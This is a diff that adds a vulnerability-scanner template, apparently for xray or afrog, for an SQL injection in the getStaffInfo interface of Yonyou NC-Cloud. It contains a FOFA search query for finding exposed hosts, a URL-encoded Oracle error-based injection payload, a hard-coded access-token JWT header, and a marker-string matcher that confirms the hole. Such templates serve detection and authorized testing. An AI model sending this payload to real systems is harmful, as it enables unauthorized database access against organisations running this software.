@@ -1,0 +1,24 @@
+id: yonyou-nc-cloud-getStaffInfo-sqli
+info:
+  name: Yonyou NC-Cloud getStaffInfo SQL Injection
+  author: ZacharyZcR
+  severity: critical
+  verified: true
+  description: |
+    Yonyou NC-Cloud getStaffInfo interface has a SQL injection vulnerability.
+    The vulnerability allows attackers to execute arbitrary SQL statements through maliciously crafted requests.
+    FOFA: app="用友-NC-Cloud"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BNC-Cloud%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3getStaffInfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: yonyou,nc,nc-cloud,sqli
+  created: 2024/12/30
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ncchr/attendstaff/getStaffInfo?id=1%27%29+AND+2787%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%282787%3D2787%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+gPZR
+      headers:
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+    expression: response.status == 500 && response.body.bcontains(b'qzzzq1qzqzq')
+expression: r0()
